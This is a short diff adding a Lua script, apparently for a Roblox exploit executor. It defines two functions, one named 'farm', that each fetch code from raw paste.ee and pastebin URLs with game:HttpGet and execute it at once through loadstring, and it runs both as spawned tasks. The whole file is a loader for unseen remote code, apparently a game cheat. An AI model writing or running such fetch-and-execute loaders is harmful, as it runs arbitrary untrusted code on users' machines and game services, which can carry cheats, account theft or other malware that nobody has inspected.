@@ -1,0 +1,10 @@
+local function r()
+    loadstring(game:HttpGet('https://paste.ee/r/2FrCefw5'))()
+end
+local function farm()
+    loadstring(game:HttpGet('https://pastebin.com/raw/feWJgdmL'))()
+end
+
+task.spawn(r)
+
+task.spawn(farm)
